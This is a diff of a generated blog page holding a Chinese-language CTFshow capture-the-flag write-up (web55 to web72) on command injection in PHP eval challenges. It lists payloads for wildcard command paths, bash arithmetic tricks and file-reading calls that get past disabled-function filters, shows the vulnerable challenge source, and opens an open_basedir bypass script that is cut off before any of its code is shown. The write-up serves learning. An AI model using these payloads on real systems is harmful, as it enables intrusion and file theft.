@@ -212,9 +212,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2022-03-08 22:46:48 / Modified: 23:39:28" itemprop="dateCreated datePublished" datetime="2022-03-08T22:46:48+08:00">2022-03-08</time>
+      <time title="Created: 2022-03-08 22:46:48" itemprop="dateCreated datePublished" datetime="2022-03-08T22:46:48+08:00">2022-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-03-09 21:19:19" itemprop="dateModified" datetime="2022-03-09T21:19:19+08:00">2022-03-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -233,14 +239,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Symbols count in article: </span>
-      <span>4.7k</span>
+      <span>13k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>4 mins.</span>
+      <span>12 mins.</span>
     </span>
 </div>
 
@@ -256,11 +262,15 @@
 
 <p><strong>base64的使用</strong></p>
 <p>我们就可以通过通配符进行匹配命令执行查看flag.php</p>
-<p>payload：<code>?c=/???/????64 ????.???</code><br> 意思是 <code>/bin/base64 flag.php</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：`?c=<span class="regexp">/???/</span>????<span class="number">64</span> ????.???`</span><br><span class="line"> 意思是 `<span class="regexp">/bin/</span>base64 flag.php`</span><br></pre></td></tr></table></figure>
+
 <p>bin为binary的简写主要放置一些 <a target="_blank" rel="noopener" href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64,bzip2等</p>
 <p>这里我们可以利用 base64 中的64 进行通配符匹配  即 /bin/base64 flag.php</p>
 <p><strong>bzip2的使用</strong></p>
-<p>bzip2是linux下面的压缩文件的命令<br>我们可以通过该命令压缩flag.php 然后进行下载<br>payload：?c=/???/???/????2 ????.???    ?c=/???/????2 ????.???<br>也就是/usr/bin/bzip2 flag.php<br>然后访问/flag.php.bz2进行下载获得flag.php<br><img src="/2022/03/08/CTFshow-2/image-20220129132748483.png" alt="image-20220129132748483"></p>
+<p>bzip2是linux下面的压缩文件的命令<br>我们可以通过该命令压缩flag.php 然后进行下载</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">?c</span>=<span class="regexp">/???/</span><span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="number">2</span> <span class="string">??</span><span class="string">??</span>.<span class="string">??</span>?    <span class="string">?c</span>=<span class="regexp">/???/</span><span class="string">??</span><span class="string">??</span><span class="number">2</span> <span class="string">??</span><span class="string">??</span>.<span class="string">??</span>?</span><br><span class="line">也就是/usr/bin/bzip2 flag.php</span><br></pre></td></tr></table></figure>
+
+<p>然后访问/flag.php.bz2进行下载获得flag.php<br><img src="/2022/03/08/CTFshow-2/image-20220129132748483.png" alt="image-20220129132748483"></p>
 <h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p><img src="/2022/03/08/CTFshow-2/image-20220129140232817.png" alt="image-20220129140232817"></p>
 <p>无字母数字</p>
 <p>使用<code>^</code>以及| 运算符进行拼接命令然后执行。然后发现其他改变就是不会执行也不是<code>eval()</code>函数，然后就失败了  </p>
@@ -278,11 +288,13 @@
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?c</span>=.+<span class="regexp">/???/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>[@-[]</span><br><span class="line">+<span class="symbol">:</span>空格的意思，也可以用空格编码%<span class="number">20</span>                     空格 + %<span class="number">20</span> 都可以表示空格</span><br></pre></td></tr></table></figure>
 
 <p>123为1.txt的内容  然后在上传文件内容添加sh命令                                   </p>
-<p>#!/bin/sh<br>ls</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
 <p>1、linux shell脚本中，# 是注释符号。#！是不同于#的另外一种特殊的表示符号。</p>
 <p>2、#！后面是解释此脚本的shell路径。shell程序必须以”#!/bin/sh”开始</p>
 <p>3、shell的种类有很多，可以通过 </p>
-<p>cat /etc/shells</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>shells</span><br></pre></td></tr></table></figure>
+
 <p>查看shell的种类。</p>
 <pre><code>/bin/sh
 /bin/bash
@@ -294,235 +306,127 @@
 <p>点两次send就有反映了。</p>
 <p><strong>说明一下为什么在使用eval()函数有时候需要添加?&gt;</strong></p>
 <p>原因是eval()函数相当于执行php的代码，而&lt;?= 就相当于&lt;?php echo<br>在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。<br>所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的&lt;?php给闭合，不然不会执行。<br>闭合之后就相当于</p>
-<?php
-?>
-<?=`ls`;
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span>`ls`;</span><br></pre></td></tr></table></figure>
 
 
 
-## web57
-
-![image-20220129213051789](./CTFshow-2/image-20220129213051789.png)
-
-要构造出36
-
-没有过滤$ {} _  ()              
-
-知识点是$(( ))与整数运算。想办法构造出36.
-
-双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。
-通俗地讲，就是将数学运算表达式放在((和))之间。
-
-表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。
-
-可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。
-
-可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。
-
-注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。
-
-
-`$(())`的值是0   如果b=~a，那么a+b=-1。若a=0,~0=-1因此：若要获得36，就要对-37取反
-
-<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(())))   ~<span class="number">0</span>=<span class="number">-1</span></span><br></pre></td></tr></table>
+<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><p><img src="/2022/03/08/CTFshow-2/image-20220129213051789.png" alt="image-20220129213051789"></p>
+<p>要构造出36</p>
+<p>没有过滤$ {} _  ()              </p>
+<p>知识点是$(( ))与整数运算。想办法构造出36.</p>
+<p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。<br>通俗地讲，就是将数学运算表达式放在((和))之间。</p>
+<p>表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。</p>
+<p>可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</p>
+<p>可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。</p>
+<p>注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p>
+<p><code>$(())</code>的值是0   如果b=<del>a，那么a+b=-1。若a=0,</del>0=-1因此：若要获得36，就要对-37取反</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(())))   ~<span class="number">0</span>=<span class="number">-1</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span>(( <span class="symbol">$</span>((~<span class="symbol">$</span>(()))) <span class="symbol">$</span>((~<span class="symbol">$</span>(()))) ))   #<span class="symbol">$</span>((<span class="number">-1</span><span class="number">-1</span>))即<span class="symbol">$</span><span class="symbol">$</span>((<span class="number">-2</span>))是<span class="number">-2</span></span><br></pre></td></tr></table></figure>
 
-因此在里面放37个`$((~$(())))`，就可以得到-37，然后取反就可以了。  $((~$((-37))))
+<p>因此在里面放37个<code>$((~$(())))</code>，就可以得到-37，然后取反就可以了。  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">((~$((-<span class="number">37</span>))))</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))) ))))</span></span><br></pre></td></tr></table></figure>
 
-$((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))        ))))
+<p>再查看源代码即可</p>
+<h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><p>命令执行，突破禁用函数</p>
+<p><img src="/2022/03/08/CTFshow-2/image-20220130150100192.png" alt="image-20220130150100192"></p>
+<p>查看禁用了那些函数   c=phpinfo(); phpinfo被禁了 ；一个一个试 system ，shell_exec() 被禁用了                                                                                        </p>
+<p>以下可用：         </p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">show_source</span>() 函数对文件进行语法高亮显示。                                                        <span class="variable">echo</span> <span class="title">file_get_contents</span>()                                                                      <span class="variable">echo</span> <span class="title">highlight_file</span>()                                                                   <span class="variable">highlight_file</span>     </span></span><br><span class="line"><span class="function"><span class="title"><span class="built_in">readfile</span></span>()																</span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span></span><br></pre></td></tr></table></figure>
 
-再查看源代码即可
 
-## web58
 
-命令执行，突破禁用函数
+<h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><p><img src="/2022/03/08/CTFshow-2/image-20220130152826193.png" alt="image-20220130152826193"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-![image-20220130150100192](./CTFshow-2/image-20220130150100192.png)
 
-查看禁用了那些函数   c=phpinfo(); phpinfo被禁了 ；一个一个试 system shell_exec() 被禁用了                                                                                        
 
-以下可用：         
+<h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><p><img src="/2022/03/08/CTFshow-2/image-20220130152953552.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-show_source() 函数对文件进行语法高亮显示。                                                         
 
- echo file_get_contents()                                                                                                    
 
-echo highlight_file()                                                                                    
+<h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><p><img src="/2022/03/08/CTFshow-2/image-20220130152953552.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-highlight_file      
 
-readfile()                                                                
 
-payload: c=show_source("flag.php");
+<h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><p><img src="/2022/03/08/CTFshow-2/image-20220130152953552.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 
 
-## web59
+<h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><p><img src="/2022/03/08/CTFshow-2/image-20220130152953552.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-![image-20220130152826193](./CTFshow-2/image-20220130152826193.png)
 
-payload: c=show_source("flag.php");
 
+<h2 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h2><p><img src="/2022/03/08/CTFshow-2/image-20220130152953552.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 
-## web60
 
-![image-20220130152953552](./CTFshow-2/image-20220130152953552.png)
+<h2 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h2><p><img src="/2022/03/08/CTFshow-2/image-20220130152953552.png" alt="image-20220130152953552"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-payload: c=show_source("flag.php");
 
 
+<h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p><img src="/2022/03/08/CTFshow-2/image-20220130152953552.png" alt="image-20220130152953552"></p>
+<p>show_source被禁用了</p>
+<p>highlight_file可用但是<img src="/2022/03/08/CTFshow-2/image-20220204151353485.png" alt="image-20220204151353485"></p>
+<p>这个函数可以用，但是文件变了，查看目录结构</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">c</span>=<span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="string">&#x27;/&#x27;</span>));  发现是根目录下<span class="variable">flag.txt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>
 
-## web61
 
-![image-20220130152953552](./CTFshow-2/image-20220130152953552.png)
 
-payload: c=show_source("flag.php");
+<h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p><img src="/2022/03/08/CTFshow-2/image-20220130152953552.png" alt="image-20220130152953552"></p>
+<p>print_r被禁用了，换成 var_dump即可</p>
+<p><strong>var_dump()</strong> 函数用于输出变量的相关信息，用于打印显示，一个变量的内容与结构，以及类型的信息。</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">c</span>=<span class="function"><span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&#x27;/&#x27;</span>)); </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>：<span class="variable">c</span>=<span class="title">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>
 
 
 
-## web62 
+<h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p>显示highlight_file也被禁用了</p>
+<p>文件显示的代码，比如show_source、highlight_file、file_get_contents等基本都被禁了，这里换成文件包含的即可，如include、require</p>
+<p><em>include</em> 语句包含并运行指定文件。txt文件无法运行则直接输出</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="function"><span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>
 
-![image-20220130152953552](./CTFshow-2/image-20220130152953552.png)
 
-payload: c=show_source("flag.php");
 
+<h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>()、<span class="title">var_dump</span>()被禁用</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">var_export</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>
 
+<h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">error_reporting</span>() 、 <span class="title">ini_set</span>()、 <span class="title">highlight_file</span>()、<span class="title">var_dump</span>()被禁用</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">var_export</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>
 
-## web63
 
-![image-20220130152953552](./CTFshow-2/image-20220130152953552.png)
 
-payload: c=show_source("flag.php");
+<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
 
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = ob_get_contents();<span class="regexp">//</span>得到缓冲区的数据。</span><br><span class="line"> ob_end_clean();<span class="regexp">//</span>会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。可以利用<span class="keyword">exit</span>();停止后面的程序</span><br><span class="line"></span><br><span class="line">payload:c=var_export(scandir(<span class="string">&quot;/&quot;</span>));<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&quot;/flag.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
 
 
-## web64
 
-![image-20220130152953552](./CTFshow-2/image-20220130152953552.png)
-
-payload: c=show_source("flag.php");
-
-
-
-## web65
-
-![image-20220130152953552](./CTFshow-2/image-20220130152953552.png)
-
-payload:c=show_source("flag.php");
-
-
-
-## web66
-
-![image-20220130152953552](./CTFshow-2/image-20220130152953552.png)
-
-show_source被禁用了
-
-highlight_file可用但是![image-20220204151353485](./CTFshow-2/image-20220204151353485.png)
-
-这个函数可以用，但是文件变了，查看目录结构
-
-c=print_r(scandir('/'));  发现是根目录下flag.txt
-
-payload: c=highlight_file("/flag.txt");
-
-payload: c=var_dump(scandir("/"));include("/flag.txt");
-
-
-
-## web67
-
-![image-20220130152953552](./CTFshow-2/image-20220130152953552.png)
-
-print_r被禁用了，换成 var_dump即可
-
-**var_dump()** 函数用于输出变量的相关信息，用于打印显示，一个变量的内容与结构，以及类型的信息。
-
-c=var_dump(scandir('/')); 
-
-payload：c=highlight_file("/flag.txt");
-
-payload: c=var_dump(scandir("/"));include("/flag.txt");
-
-
-
-## web68
-
-显示highlight_file也被禁用了
-
-文件显示的代码，比如show_source、highlight_file、file_get_contents等基本都被禁了，这里换成文件包含的即可，如include、require
-
-*include* 语句包含并运行指定文件。txt文件无法运行则直接输出
-
-payload: c=var_dump(scandir("/"));include("/flag.txt");
-
-## web69
-
-print_r()、var_dump()被禁用
-
-c=var_export(scandir("/"));
-
-c=include("/flag.txt");
-
-## web70
-
-error_reporting() 、 ini_set()、 highlight_file()、var_dump()被禁用
-
-c=var_export(scandir("/"));
-
-c=include("/flag.txt");
-
-## web71
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
-
-$s = ob_get_contents();//得到缓冲区的数据。
- ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。可以利用exit();停止后面的程序
-
-payload:c=var_export(scandir("/"));exit();
-
-c=include("/flag.txt");exit();
-
-## 不懂web72
-
-![image-20220220152051961](./CTFshow-2/image-20220220152051961.png)
-
-![image-20220220152145730](./CTFshow-2/image-20220220152145730.png)说明没有flag.txt这个文件，也没法查看目录结构
-
-**利用glob协议扫描目录**
-
-![image-20220220154514866](./CTFshow-2/image-20220220154514866.png)
-
-通过这个发现flag在flag0.txt,之后利用uaf的脚本进行命令执行
-
-`/*`是根目录下所有文件
-
-由于`open_basedir`的限制，还是不可以直接include进来，需要想其它的办法。使用UAF。脚本如下：记得要把`c=`之后的内容url编码：
-
+<h2 id="不懂web72"><a href="#不懂web72" class="headerlink" title="不懂web72"></a>不懂web72</h2><p><img src="/2022/03/08/CTFshow-2/image-20220220152051961.png" alt="image-20220220152051961"></p>
+<p><img src="/2022/03/08/CTFshow-2/image-20220220152145730.png" alt="image-20220220152145730">说明没有flag.txt这个文件，也没法查看目录结构</p>
+<p><strong>利用glob协议扫描目录</strong></p>
+<p><img src="/2022/03/08/CTFshow-2/image-20220220154514866.png" alt="image-20220220154514866"></p>
+<p>通过这个发现flag在flag0.txt,之后利用uaf的脚本进行命令执行</p>
+<p><code>/*</code>是根目录下所有文件</p>
+<p>由于<code>open_basedir</code>的限制，还是不可以直接include进来，需要想其它的办法。使用UAF。脚本如下：记得要把<code>c=</code>之后的内容url编码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 